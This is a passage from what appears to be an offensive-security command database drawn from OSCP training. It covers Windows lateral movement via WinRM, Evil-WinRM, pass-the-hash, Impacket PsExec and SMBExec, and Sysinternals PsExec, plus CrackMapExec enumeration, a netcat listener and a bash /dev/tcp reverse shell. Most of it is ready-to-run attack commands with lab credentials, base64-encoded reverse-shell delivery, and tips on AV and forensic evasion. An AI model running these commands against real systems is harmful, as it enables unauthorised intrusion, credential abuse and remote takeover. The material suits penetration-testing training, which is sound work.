- Remove session:
Remove-PSSession $session
- Timeout:
Default idle timeout 4 hours (configurable with -SessionOption)

PARALLEL EXECUTION:
Create array of sessions, use Invoke-Command -Session $sessions -Parallel.

Time:
2-3 minutes for setup, <1 minute per subsequent command

EXAM TIP:
Use for scripted enumeration across multiple targets.","high","","","","{""Access denied"": ""Verify credentials: Test-WSMan -ComputerName <TARGET> -Credential $credential"", ""Session creation fails"": ""Check WinRM service: Get-Service WinRM -ComputerName <TARGET>"", ""Session disconnected"": ""Network interruption. Reconnect: Connect-PSSession -Session $session"", ""Session not found"": ""Session may have timed out (default 4 hours). Create new session""}","{""New-PSSession"": ""Creates persistent PowerShell session object (reusable)"", ""-Session"": ""References existing session object for command execution"", ""-ScriptBlock"": ""PowerShell code block to execute remotely"", ""Invoke-Command"": ""Executes commands in remote session"", ""$session"": ""Variable storing session object for reuse""}","","[""winrm-enter-pssession"", ""winrm-invoke-command""]",""
"winrm-invoke-command","WinRM - Invoke-Command One-Shot Execution","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {<COMMAND>}","Execute single PowerShell command remotely without persistent session using Invoke-Command","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {Get-Process}","EDUCATIONAL CONTEXT:
Invoke-Command is PowerShell's most versatile remote execution method - supports one-shot and persistent sessions.

WHY ONE-SHOT:
Quick command execution without session management overhead.

WHEN TO USE:
- Single command
- Quick enumeration
- Testing connectivity

COMPARISON:
- Faster for single command than Enter-PSSession (no interactive overhead)
- Slower for multiple commands than New-PSSession (no session reuse)

MULTIPLE TARGETS:
Supports parallel execution:
  Invoke-Command -ComputerName @('target1','target2','target3') -ScriptBlock {whoami}

SCRIPT EXECUTION:
Use -FilePath to execute local script on remote system:
  Invoke-Command -FilePath .\script.ps1 -ComputerName <TARGET> -Credential $credential

OUTPUT HANDLING:
Results include PSComputerName property for multi-target tracking.

ALTERNATIVE SYNTAX:
Shorter form:
  Invoke-Command -ComputerName <TARGET> {<COMMAND>} -Credential $credential

Time:
1-2 minutes per command

EXAM TIP:
Best for quick enumeration, use New-PSSession for sustained access.","high","","","","{""Access denied"": ""User not in Remote Management Users group. Verify: net localgroup 'Remote Management Users' /domain"", ""WinRM client error"": ""Enable WinRM on target: Enable-PSRemoting -Force"", ""Script block too long"": ""Use -FilePath instead: Invoke-Command -FilePath .\\script.ps1 -ComputerName <TARGET>"", ""No output returned"": ""Command may still execute - verify on target system""}","{""Invoke-Command"": ""Executes commands on remote computers"", ""-ComputerName"": ""Target system (can be array for multiple targets)"", ""-ScriptBlock"": ""PowerShell code to execute remotely"", ""-FilePath"": ""Alternative to -ScriptBlock - execute local script remotely"", ""-ArgumentList"": ""Pass parameters to script block""}","","[""winrm-new-pssession"", ""evil-winrm-creds"", ""wmi-invoke-method""]",""
"winrm-winrs","WinRM - Legacy winrs.exe Command","active-directory","winrs -r:<TARGET> -u:<USER> -p:<PASS> <COMMAND>","Execute commands remotely using legacy winrs.exe utility (Windows Remote Shell)","lateral-movement","winrs -r:192.168.50.73 -u:corp\jen -p:Nexus123! whoami","OSCP TRAINING MATERIAL - WINRS (WINDOWS REMOTE SHELL):
TRAINING EXAMPLE:
From OSCP module, jen's credentials used to execute commands remotely on FILES04:
  winrs -r:files04 -u:jen -p:Nexus123! ""cmd /c hostname & whoami""

EXPECTED OUTPUT:
  FILES04
  corp\jen

WHAT IS WINRS:
Windows Remote Shell - command-line WinRM client pre-dating PowerShell remoting.

Built into all modern Windows systems.

Alternative to PsExec/WMI when PowerShell unavailable.

PROTOCOL:
WinRM over WS-Management:
- Port 5986:
Encrypted HTTPS traffic
- Port 5985:
Plain HTTP
- Microsoft's implementation of WS-Management protocol

GROUP MEMBERSHIP REQUIREMENT (CRITICAL):
For winRS to work, domain user must be part of:
- Administrators group (local admin rights), OR
- Remote Management Users group on target host

This is explicitly stated in training:
""For WinRS to work, the domain user needs to be part of the Administrators or Remote Management Users group on the target host.""

REVERSE SHELL DEPLOYMENT:
Training shows replacing commands with base64-encoded PowerShell reverse shell:
  winrs -r:files04 -u:jen -p:Nexus123! ""powershell -nop -w hidden -e JABjAGwAaQBlAG4A...""

This spawned reverse shell to Netcat listener on Kali (port 443), achieving lateral movement.

LIMITATIONS VS POWERSHELL REMOTING:
- cmd.exe commands only (unless invoking powershell.exe)
- No interactive persistent session
- No tab completion or command history
- Less sophisticated than Enter-PSSession

COMMAND EXECUTION SYNTAX:
- Use ""cmd /c"" prefix for multiple commands:
  winrs -r:files04 ""cmd /c hostname & whoami""

- Quote entire command string
- Commands execute in cmd.exe context, NOT PowerShell

WHEN TO USE IN OSCP:
- PowerShell remoting blocked/restricted
- Quick one-off command execution
- Older Windows systems (pre-PowerShell 2.0)
- Compatibility with cmd.exe-based tools

Time:
<1 minute per command execution

EXAM STRATEGY:
Prefer PowerShell remoting (Enter-PSSession/Invoke-Command) for better functionality.

Use winrs as fallback when PowerShell restricted.","medium","","","","{""Access denied"": ""User needs Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add"", ""WinRM not available"": ""Enable on target: winrm quickconfig -q"", ""Credentials rejected"": ""Verify password: crackmapexec winrm <TARGET> -u <USER> -p <PASS>"", ""Command not found"": ""winrs executes cmd.exe commands only, not PowerShell""}","{""-r:<TARGET>"": ""Remote computer name or IP"", ""-u:<USER>"": ""Username in DOMAIN\\user format"", ""-p:<PASS>"": ""Password for authentication"", ""-noprofile"": ""Don't load user profile (faster)"", ""-environment"": ""Set environment variables""}","","[""winrm-invoke-command"", ""evil-winrm-creds""]",""
"evil-winrm-creds","Evil-WinRM - Password Authentication","active-directory","evil-winrm -i <TARGET> -u <USER> -p '<PASS>'","Establish interactive PowerShell remoting from Kali using Evil-WinRM with password authentication","lateral-movement","evil-winrm -i 192.168.50.73 -u jen -p 'Nexus123!'","EDUCATIONAL CONTEXT:
Evil-WinRM is Ruby-based WinRM client for Kali - preferred tool for Windows lateral movement from Linux.

WHY EVIL-WINRM:
- Built-in file upload/download
- PowerShell script loading
- Executable management
- Tab completion
- Command history

ADVANTAGES:
- Native feel (PowerShell prompt)
- Upload/download commands
- Menu system (help menu)

FILE OPERATIONS:
  upload /kali/path C:\Windows\Temp\file.exe
  download C:\Users\user\file.txt /kali/path

SCRIPT LOADING:
Use -s /path/to/scripts to auto-load PowerShell scripts:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -s /opt/powershell

Scripts accessible with script_name (no .ps1 extension).

EXECUTABLE MENU:
Use -e /path/to/exes for pre-loaded binaries:
  evil-winrm -i <TARGET> -u <USER> -p '<PASS>' -e /opt/binaries

Run with Invoke-Binary.

STEALTH:
Creates standard WinRM logs (Event ID 4624, 4688) - same as legitimate admin access.

COMPARISON:
More features than Invoke-Command, easier than PSExec from Kali.

Time:
1-2 minutes for connection

EXAM TIP:
First choice for Kali  Windows lateral movement, most stable and feature-rich.

COMMON LOCATIONS:
Default Kali install, or:
  gem install evil-winrm","high","","","","{""Authorization error"": ""User not in Remote Management Users group. Verify with: crackmapexec winrm <TARGET> -u <USER> -p <PASS>"", ""Connection timeout"": ""Port 5985/5986 blocked. Check: sudo nmap -p 5985,5986 -Pn -v <TARGET>"", ""SSL certificate failed"": ""Use -S flag for HTTPS with self-signed cert, or omit -S for HTTP"", ""Password with special chars"": ""Wrap password in single quotes: -p 'Pass@123!'"", ""Domain authentication"": ""Specify domain: -u 'DOMAIN\\user' or -u user@domain.com""}","{""-i"": ""Target IP address"", ""-u"": ""Username for authentication"", ""-p"": ""Password (use single quotes to escape special characters)"", ""-H"": ""Use NTLM hash instead of password (see evil-winrm-hash)"", ""-S"": ""Use SSL (HTTPS on port 5986)"", ""-P"": ""Specify custom port (default 5985 HTTP, 5986 HTTPS)"", ""-s"": ""Path to PowerShell scripts directory (auto-loaded)"", ""-e"": ""Path to executables directory (auto-loaded)""}","","[""evil-winrm-hash"", ""winrm-enter-pssession"", ""psexec-impacket-shell""]",""
"evil-winrm-hash","Evil-WinRM - Pass-the-Hash","active-directory","evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>","Authenticate to WinRM using NTLM hash instead of password (pass-the-hash attack)","lateral-movement","evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b","EDUCATIONAL CONTEXT:
Pass-the-hash allows authentication with NTLM hash without knowing plaintext password - critical for lateral movement.

WHY THIS WORKS:
Windows NTLM authentication accepts hash directly - password never needed if you have hash.

HASH EXTRACTION:
Obtain hashes with:
- secretsdump.py (Impacket)
- mimikatz (lsadump::sam)
- crackmapexec --sam

HASH FORMAT:
Only need NTLM portion (32 hex chars), LM hash optional:
- If both available:
  -H LM:NTLM

- If NTLM only:
  -H :NTLM_HASH
  OR
  -H NTLM_HASH

STEALTH:
Creates same logs as password authentication - hash usage not visible in logs.

PERSISTENCE:
Hash remains valid until password changed - can reuse for multiple sessions.

LATERAL MOVEMENT:
Same hash works across all machines where account is local admin (local accounts) or domain member (domain accounts).

Time:
1-2 minutes (same as password auth)

EXAM TIP:
Critical technique after dumping SAM/NTDS - enables lateral movement without password cracking.","high","","","","{""Invalid hash format"": ""Use 32-character hex NTLM hash only (no LM hash needed)"", ""Authorization error"": ""Hash may be invalid or user lacks WinRM access. Verify hash with: crackmapexec smb <TARGET> -u <USER> -H <HASH>"", ""Connection refused"": ""Port 5985 closed. Check: sudo nmap -p 5985 -Pn -v <TARGET>"", ""Hash accepted but access denied"": ""User account may be disabled or WinRM restricted""}","{""-H"": ""NTLM hash for pass-the-hash authentication"", ""-i"": ""Target IP address"", ""-u"": ""Username (hash used instead of password)"", ""Full hash format"": ""LM:NTLM (use :NTLM_HASH if no LM hash available)""}","","[""evil-winrm-creds"", ""psexec-impacket-shell""]",""
"test-wsman","WinRM - Test-WSMan Verification","active-directory","Test-WSMan -ComputerName <TARGET>","Verify WinRM service is accessible and responding on target before attempting authentication","lateral-movement","Test-WSMan -ComputerName 192.168.50.73","EDUCATIONAL CONTEXT:
Test-WSMan performs unauthenticated connectivity test to WinRM service - quick way to verify WinRM availability before attempting authentication.

WHY TEST FIRST:
Avoids failed authentication attempts, validates port accessibility, identifies protocol version.

WHAT IT CHECKS:
WinRM service responding, protocol version supported, product version (Windows OS).

NO CREDENTIALS:
Basic test requires no authentication - checks if service is listening.

PORTS:
Default HTTP on 5985, HTTPS on 5986 (use -UseSSL).

VERBOSE OUTPUT:
Returns XML identifying service details (wsmid, ProtocolVersion, ProductVendor).

ALTERNATIVE TEST:
From Kali use nmap -p 5985,5986 or crackmapexec winrm <TARGET> (shows WINRM in banner).

TIME ESTIMATE:
<30 seconds.

EXAM TIP:
Quick check before attempting lateral movement - confirms WinRM available.","medium","","","","{""Cannot connect"": ""Port 5985 blocked by firewall: sudo nmap -p 5985,5986 -Pn -v <TARGET>"", ""Request timeout"": ""Target unreachable or WinRM disabled: Test-NetConnection <TARGET> -Port 5985"", ""SSL/TLS error"": ""Use -UseSSL for HTTPS (port 5986) or omit for HTTP (port 5985)"", ""Access denied"": ""This test doesn't require credentials - if denied, WinRM may be restricted to specific IPs""}","{""Test-WSMan"": ""Tests WinRM connectivity and returns service info"", ""-ComputerName"": ""Target system to test"", ""-Credential"": ""Optional - test with specific credentials"", ""-UseSSL"": ""Test HTTPS (port 5986) instead of HTTP (port 5985)"", ""-Port"": ""Specify non-standard port (default 5985)""}","","",""
"winrm-revshell-invoke","WinRM - PowerShell Reverse Shell via Invoke-Command","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password); Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBlock {powershell -nop -w hidden -e <BASE64_PAYLOAD>}","Deploy base64-encoded PowerShell reverse shell through WinRM for callback to attacker","lateral-movement","$password = ConvertTo-SecureString 'Nexus123!' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('corp\jen', $password); Invoke-Command -ComputerName 192.168.50.73 -Credential $credential -ScriptBlock {powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AC...}","EDUCATIONAL CONTEXT:
Combines WinRM lateral movement with PowerShell reverse shell for full interactive callback.

WHY BASE64:
Avoids escaping issues with special characters in PowerShell one-liner, bypasses some basic AV signature detection.

HOW TO GENERATE PAYLOAD:
Use base64-encode-powershell command or:
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload); $encoded = [Convert]::ToBase64String($bytes).

WHAT HAPPENS:
Invoke-Command executes 'powershell -e' on target  target decodes base64  executes reverse shell  connects back to LHOST:LPORT.

STEALTH CONSIDERATIONS:
-w hidden prevents visible window, -nop avoids profile scripts, base64 bypasses simple string detection.

LOGGING:
Creates WinRM event logs (Event ID 4624, 4688) and PowerShell script block logging if enabled.

MANUAL DECODE TEST:
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>')) to verify payload.

ALTERNATIVES:
Use Evil-WinRM to upload nc.exe or other reverse shell binary.

TIME ESTIMATE:
3-5 minutes including payload generation and listener setup.

EXAM TIP:
Pre-generate base64 payloads before exam for common LHOST/LPORT combinations.","high","","","","{""No connection received"": ""Verify LHOST/LPORT in encoded payload match listener: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"", ""Access denied"": ""User lacks Remote Management Users membership: net localgroup 'Remote Management Users' <USER> /add"", ""Payload execution error"": ""Test decoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"", ""Firewall blocking callback"": ""Test outbound connectivity first: Test-NetConnection <LHOST> -Port <LPORT>"", ""PowerShell not found"": ""Use full path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""}","{""-nop"": ""No profile - don't load PowerShell profiles (faster execution, stealthy)"", ""-w hidden"": ""Hidden window - no visible PowerShell window spawned"", ""-e <BASE64>"": ""Encoded command - executes base64-encoded payload"", ""-ScriptBlock"": ""PowerShell code block executed remotely via WinRM""}","","[""wmi-powershell-revshell""]",""
"psexec-impacket-shell","PSExec - Impacket Interactive Shell","active-directory","impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Execute Impacket PSExec from Kali to gain SYSTEM-level interactive shell on remote Windows via SMB","lateral-movement","impacket-psexec corp.com/administrator:Nexus123!@192.168.50.73","EDUCATIONAL CONTEXT:
PSExec is classic lateral movement technique providing SYSTEM-level shell immediately.

WHY THIS WORKS:
Uploads binary to ADMIN$ share, creates Windows service, executes payload as SYSTEM.

HOW IT WORKS:
1) Connects to IPC$ share, 2) Uploads RemCom.exe to ADMIN$ share, 3) Creates/starts service via SCM, 4) Service executes RemCom.exe as SYSTEM, 5) Spawns cmd.exe shell.

ADVANTAGES:
Spawns SYSTEM shell (highest privilege), most reliable for OSCP, well-documented.

DISADVANTAGES:
Writes binary to disk (forensics), creates service (event logs), easier to detect than WMI/DCOM.

MANUAL ALTERNATIVE:
Microsoft PsExec64.exe from Sysinternals (see psexec-sysinternals).

UAC LIMITATION:
2014 Microsoft patch blocks local admin PTH for non-RID-500 accounts (domain users unaffected).

CLEANUP:
PSExec automatically cleans up service and binary on exit.

BEHIND THE SCENES:
Service creation generates Event ID 7045, authentication creates 4624, process creation 4688.

TIME ESTIMATE:
1-2 minutes for connection establishment.

EXAM TIP:
First lateral movement technique to try when credentials available - most stable and straightforward.","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""STATUS_ACCESS_DENIED"": ""User not local admin. Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> (look for Pwn3d!)"", ""STATUS_OBJECT_NAME_NOT_FOUND"": ""ADMIN$ share not accessible. Verify firewall allows File and Printer Sharing"", ""Connection timeout"": ""Firewall blocking SMB: sudo nmap -p 445 -Pn -v <TARGET>"", ""UAC restriction"": ""Built-in local admin accounts blocked by UAC (except RID 500 Administrator). Use domain user or RID 500""}","{""-hashes :NTLM"": ""Pass-the-hash with NTLM hash instead of password"", ""-target-ip"": ""Specify IP if hostname resolution fails"", ""-no-pass"": ""Don't prompt for password (use with -hashes)"", ""-k"": ""Use Kerberos authentication (requires TGT)"", ""-dc-ip"": ""Domain Controller IP for Kerberos authentication""}","","[""psexec-sysinternals"", ""smbexec-impacket-fileless"", ""wmi-impacket-exec"", ""evil-winrm-creds""]",""
"psexec-sysinternals","PSExec - Microsoft Sysinternals (Kerberos)","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> cmd","Execute Microsoft official PsExec64.exe from compromised Windows host (requires Kerberos authentication)","lateral-movement","PsExec64.exe -accepteula \\DC01 -u corp\administrator -p Nexus123! cmd","OSCP TRAINING MATERIAL - PSEXEC FROM SYSINTERNALS SUITE:
TRAINING EXAMPLE:
From OSCP module, jen's credentials used from CLIENT74 to move laterally to FILES04:
'PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd'

Output confirmed successful lateral movement:
- PsExec v2.4 banner
- Interactive cmd.exe shell on FILES04
- 'whoami' returned 'corp\jen'
- 'hostname' returned 'FILES04'

THREE PREREQUISITES (CRITICAL - FROM TRAINING):
1.

User must be part of Administrators local group
2.

ADMIN$ share must be available  
3.

File and Printer Sharing has to be turned on

Training explicitly states:
""Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.""

HOW PSEXEC WORKS (TECHNICAL BREAKDOWN FROM TRAINING):
1.

Writes psexesvc.exe into C:\Windows directory on target
2.

Creates and spawns a service on the remote host  
3.

Runs the requested program/command as a child process of psexesvc.exe

This is why you see 'Starting PSEXESVC service' in the output.

EXECUTION CONTEXT:
From training scenario:
- Attacker already had RDP access as offsec local admin on CLIENT74
- PsExec binary available at C:\Tools\SysinternalsSuite (full suite pre-installed)
- Executed 64-bit version (PsExec64.exe) for modern Windows targets
- Used -i flag for interactive session (spawns visible cmd.exe shell)

FLAG BREAKDOWN:
- -i:
Interactive mode (required for visible shell in training example)
- \\FILES04:
Target server (double backslash UNC path syntax)
- -u corp\jen:
Domain\username format (jen is domain user + local admin on FILES04)
- -p Nexus123!:
Password in plaintext
- cmd:
Command to execute (spawns interactive command shell)

SYSINTERNALS SUITE LOCATION IN OSCP LABS:
C:\Tools\SysinternalsSuite
- Full suite includes:
PsExec, PsInfo, PsKill, PsList, etc.
- Available on compromised Windows clients in OSCP environment
- No download needed - pre-staged in common locations

KERBEROS VS NTLM:
- Sysinternals PSExec uses Kerberos authentication (requires hostname or FQDN)
- Cannot use IP addresses directly (Kerberos requires SPN with hostname)
- Impacket PSExec uses NTLM (IP addresses work)

MICROSOFT LEGITIMACY:
- Signed by Microsoft Corporation
- Trusted by Windows Defender and enterprise AV
- Appears as legitimate admin tool in logs
- Whitelisted by default on most corporate systems

WHEN TO USE IN OSCP:
- Already pivoted to Windows client (CLIENT74, CLIENT76, etc.)
- Have domain credentials with local admin rights
- Target hostname known (not just IP)
- Want most reliable/stable lateral movement from Windows

COMPARISON - SYSINTERNALS VS IMPACKET PSEXEC:
- Sysinternals:
WindowsWindows, Kerberos, hostname required, Microsoft-signed
- Impacket:
KaliWindows, NTLM, IP addresses work, Python-based

SERVICE CREATION (FORENSIC ARTIFACT):
- Event ID 7045:
Service installed (PSEXESVC)
- Service Name:
PSEXESVC
- Service File Name:
%SystemRoot%\PSEXESVC.exe
- Service Type:
User mode service
- Service Start Type:
Demand start

CLEANUP:
PSExec automatically removes PSEXESVC.exe and stops/deletes service on exit (clean disconnection).

TIME ESTIMATE:
2-3 minutes (including locating binary, command construction, execution).

EXAM STRATEGY:
Use Impacket PSExec from Kali for initial lateral movement.

Use Sysinternals PSExec when pivoting through compromised Windows clients with domain credentials.","high","","","","{""Access is denied"": ""User needs local admin rights. Verify: net localgroup administrators /domain"", ""Network path not found"": ""Verify target reachable: ping <TARGET>"", ""Couldn't access target"": ""ADMIN$ share blocked. Check firewall: Test-NetConnection <TARGET> -Port 445"", ""Account not authorized"": ""Kerberos authentication issue. Try IP address instead of hostname"", ""No EULA accepted"": ""Add -accepteula flag to suppress license prompt""}","{""-accepteula"": ""Automatically accept EULA (suppresses license agreement prompt)"", ""\\\\<TARGET>"": ""Remote computer name or IP (double backslash syntax)"", ""-u"": ""Username in DOMAIN\\user format"", ""-p"": ""Password for authentication"", ""-i"": ""Interactive session (allocates desktop)"", ""-s"": ""Run as SYSTEM account (default)"", ""-d"": ""Don't wait for process to terminate (non-interactive)"", ""-c"": ""Copy specified program to remote system""}","","[""psexec-impacket-shell"", ""psexec-sysinternals-interactive""]",""
"psexec-sysinternals-interactive","PSExec - Interactive Desktop Session","active-directory","PsExec64.exe -accepteula \\<TARGET> -u <DOMAIN>\<USER> -p <PASS> -i <SESSION_ID> <COMMAND>","Launch interactive GUI application on remote system with visible desktop using PsExec -i flag","lateral-movement","PsExec64.exe -accepteula \\DC01 -u corp\administrator -p Nexus123! -i 1 cmd","EDUCATIONAL CONTEXT:
PSExec -i flag spawns process in user's interactive desktop session (Session 1+) instead of Session 0 (services).

WHY SESSION 0 vs SESSION 1+:
Windows services run in Session 0 (non-interactive, no GUI), user desktops run in Session 1+ (interactive).

DEFAULT BEHAVIOR:
Without -i, PSExec spawns in Session 0 - GUI apps invisible.

USE CASE:
Social engineering (spawn message to user), GUI tool demonstration, test interactive applications.

BEHIND THE SCENES:
-i flag tells PSEXESVC service to create process in specified session ID.

QUERY SESSIONS:
Use 'query user' or 'query session' to enumerate session IDs on target.

COMMON SESSION IDS:
Session 0 = services, Session 1 = first logged-on user, Session 2+ = additional users (RDP, fast user switching).

STEALTH:
Visible process to logged-in user - not stealthy.

TIME ESTIMATE:
3-5 minutes including session enumeration.

EXAM TIP:
Rarely needed for OSCP - use standard psexec for command execution.

Interactive mode more relevant for social engineering or GUI testing.","medium","","","","{""Session ID not found"": ""Query sessions first: PsExec64.exe \\\\<TARGET> -u <USER> -p <PASS> query user"", ""No user logged in"": ""Can't use -i without active session. Use regular psexec-sysinternals instead"", ""Application doesn't appear"": ""User may not have focus on desktop. Verify process running: tasklist"", ""Access denied"": ""User needs local admin rights and active desktop session""}","{""-i <SESSION_ID>"": ""Interactive mode - run in specified user session (desktop visible to user)"", ""query user"": ""Run on target to enumerate session IDs before using -i"", ""-accepteula"": ""Accept license agreement automatically"", ""-s"": ""Run as SYSTEM (default)"", ""-d"": ""Don't wait for process to complete""}","","[""psexec-sysinternals""]",""
"smbexec-impacket-fileless","SMBExec - Impacket Fileless Shell","active-directory","impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>","Semi-interactive shell via SMB using Impacket SMBExec - fileless alternative to PSExec (no binary written to disk)","lateral-movement","impacket-smbexec corp.com/administrator:Nexus123!@192.168.50.73","EDUCATIONAL CONTEXT:
SMBExec provides fileless lateral movement alternative to PSExec for maximum stealth and minimal forensic footprint.

HOW IT WORKS:
1) Creates temporary batch file in ADMIN$ share, 2) Executes batch file via service, 3) Batch file runs command and redirects output to temp file, 4) SMBExec retrieves output via SMB, 5) Deletes batch and output files.

FILELESS BENEFIT:
No persistent binary on disk (unlike PSExec which uploads RemCom.exe).

STEALTH:
Less detectable than PSExec - no binary signature, no service binary, only batch files (auto-deleted).

DISADVANTAGES:
Slower than PSExec (file creation/deletion per command), less stable for long sessions.

COMPARISON:
PSExec (fast, stable, binary on disk) vs SMBExec (slow, stealthy, fileless).

USE CASE:
Maximum stealth required, antivirus detection concern, forensic evasion.

SERVICE CREATION:
Still creates service for execution (Event ID 7045) but no persistent binary.

OUTPUT MODES:
-mode SHARE (default, uses ADMIN$) vs -mode SERVER (creates temp SMB server on Kali).

TIME ESTIMATE:
2-4 minutes for initial connection, slower per-command execution.

EXAM TIP:
Use SMBExec when PSExec detected/blocked by AV, or when stealth is priority over speed.","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""STATUS_OBJECT_NAME_NOT_FOUND"": ""ADMIN$ share not accessible. Check firewall allows File and Printer Sharing"", ""Slower execution"": ""Expected - creates and deletes batch file per command for output retrieval"", ""No output returned"": ""Try -mode SERVER for alternative output method""}","{""-hashes :NTLM"": ""Pass-the-hash with NTLM hash instead of password"", ""-mode SHARE"": ""Use ADMIN$ share for execution (default)"", ""-mode SERVER"": ""Create temporary SMB server for output retrieval"", ""-shell-type powershell"": ""Use PowerShell instead of cmd.exe"", ""-codec utf-8"": ""Set character encoding for special characters""}","","[""psexec-impacket-shell"", ""wmi-impacket-exec"", ""evil-winrm-creds""]",""
"psexec-verify-firewall","PSExec - Verify File and Printer Sharing Ports","active-directory","sudo nmap -p 445,135 -Pn -sV -v <TARGET>","Verify required ports for PSExec are open (SMB 445 and RPC 135 for service creation)","lateral-movement","sudo nmap -p 445,135 -Pn -sV -v 192.168.50.73","EDUCATIONAL CONTEXT:
PSExec requires both SMB (445) and RPC (135) ports - verify before attempting lateral movement to save time.

WHY BOTH PORTS:
Port 445 for ADMIN$ share access (binary upload), port 135 for service creation via RPC.

FIREWALL DEFAULTS:
Windows Server enables File and Printer Sharing by default, workstations often block it.

SERVICE DETECTION:
-sV flag identifies SMB version (SMBv1, SMBv2, SMBv3) - important for compatibility.

MANUAL ALTERNATIVE:
Test SMB manually:
smbclient -L //<TARGET> -U <USER>.

ALTERNATIVE PORTS:
If 445 blocked, PSExec won't work - use WinRM (5985) or WMI (135 only).

BEHIND THE SCENES:
nmap sends SYN packets to ports, analyzes responses, fingerprints services.

STEALTH:
This is enumeration - creates logs on target (connection attempts).

TIME ESTIMATE:
30 seconds to 1 minute for port scan.

EXAM TIP:
Always verify ports before exploitation attempts - prevents wasted time troubleshooting authentication when ports are blocked.","high","","","","{""Both ports filtered"": ""Firewall blocking File and Printer Sharing. Try alternative: WinRM (5985), WMI (135 only)"", ""Port 445 open, 135 closed"": ""SMB accessible but service creation may fail. Try smbexec-impacket-fileless"", ""Host seems down"": ""Target blocking ICMP. Use -Pn flag (already included) to skip ping"", ""Connection timeout"": ""Network unreachable. Verify routing: ip route get <TARGET>""}","{""-p 445,135"": ""Scan SMB (445) and RPC (135) ports required for PSExec"", ""-Pn"": ""Skip ping - treat host as online (bypass ping filtering)"", ""-sV"": ""Service version detection - identify exact SMB/RPC version"", ""-v"": ""Verbose output - show progress during scan"", ""sudo"": ""Required for SYN scan and accurate OS/service detection""}","","",""
"cme-smb-shares","CrackMapExec - Enumerate SMB Shares","active-directory","crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares","Enumerate accessible SMB shares on target including ADMIN$, C$, IPC$ using CrackMapExec","lateral-movement","crackmapexec smb 192.168.50.73 -u administrator -p Nexus123! --shares","EDUCATIONAL CONTEXT:
Share enumeration confirms ADMIN$ accessibility - prerequisite for PSExec lateral movement.

WHY ADMIN$ MATTERS:
PSExec uploads binary to ADMIN$ share, creates service, executes payload.

PWNED INDICATOR:
[+] Pwn3d! confirms user has local administrator rights on target.

DEFAULT SHARES:
ADMIN$ (C:\Windows), C$ (C:\), IPC$ (inter-process communication), print$ (printer drivers).

CUSTOM SHARES:
Additional shares may contain sensitive data - enumerate contents.

PERMISSIONS:
READ,WRITE on ADMIN$ required for PSExec.

READ-only means user not admin.

ALTERNATIVE TOOLS:
smbclient -L //<TARGET> -U <USER> (manual), smbmap -u <USER> -p <PASS> -H <TARGET> (detailed permissions).

BEHIND THE SCENES:
Authenticates to IPC$ share, queries share list via SRVSVC RPC pipe.

TIME ESTIMATE:
<30 seconds for share enumeration.

EXAM TIP:
Always verify ADMIN$ accessible before attempting PSExec - saves time troubleshooting failed exploitation.","high","","","","{""Authentication failed"": ""Verify credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>"", ""No Pwn3d indicator"": ""User authenticated but not local admin - ADMIN$ not accessible"", ""ADMIN$ not in list"": ""User lacks admin rights. PSExec will fail"", ""Connection timeout"": ""Port 445 blocked. Check: sudo nmap -p 445 -Pn -v <TARGET>""}","{""--shares"": ""Enumerate all accessible SMB shares"", ""-u <USER>"": ""Username for authentication"", ""-p <PASS>"": ""Password for authentication"", ""-H <NTLM>"": ""Use NTLM hash for pass-the-hash"", ""-d <DOMAIN>"": ""Specify domain for authentication"", ""--local-auth"": ""Use local authentication instead of domain""}","","",""
"nc-listener-setup","Netcat Listener Setup","exploitation","nc -nlvp <LPORT>","Start a netcat listener to catch reverse shells","shells","nc -nlvp 443","Use port 443 to bypass egress filtering.

Always start listener BEFORE triggering reverse shell on target.","high","","","","{""port_in_use"": ""Use 'lsof -i :<LPORT>' to find process, kill or choose different port"", ""permission_denied"": ""Use ports >1024 or run with sudo for privileged ports"", ""firewall_blocking"": ""Check firewall rules: 'sudo iptables -L -n'""}","{""-n"": ""Do not perform DNS lookups (faster)"", ""-l"": ""Listen mode for incoming connections"", ""-v"": ""Verbose output showing connection details"", ""-p"": ""Specify port to listen on""}","","[""socat-listener""]","[""bash-reverse-shell"", ""python-shell-upgrade"", ""stty-shell-stabilization""]"
"bash-reverse-shell","Bash Reverse Shell","exploitation","bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1","Establish reverse shell using bash built-in TCP socket","shells","bash -i >& /dev/tcp/192.168.45.200/443 0>&1","Works on most Linux systems.

Firewall-friendly when using port 443/80.

URL-encode for web shells:
